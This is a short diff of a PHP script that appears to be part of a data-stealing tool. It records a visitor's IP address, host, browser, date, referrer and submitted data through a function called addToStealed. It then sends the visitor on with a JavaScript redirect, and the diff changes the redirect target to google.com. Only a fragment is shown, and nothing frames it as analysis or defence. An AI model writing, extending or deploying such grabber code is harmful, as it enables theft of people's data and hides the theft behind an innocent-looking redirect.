@@ -39,5 +39,5 @@
 	else 					$data	= 'No data';
 	
 	addToStealed("admin.php", $ip, $host, $navigator, $date, $heure, $provenance, $data);
-	echo "<script>window.location.replace('https://medanpedia.co.id');</script>";
+	echo "<script>window.location.replace('https://google.com');</script>";
 ?>
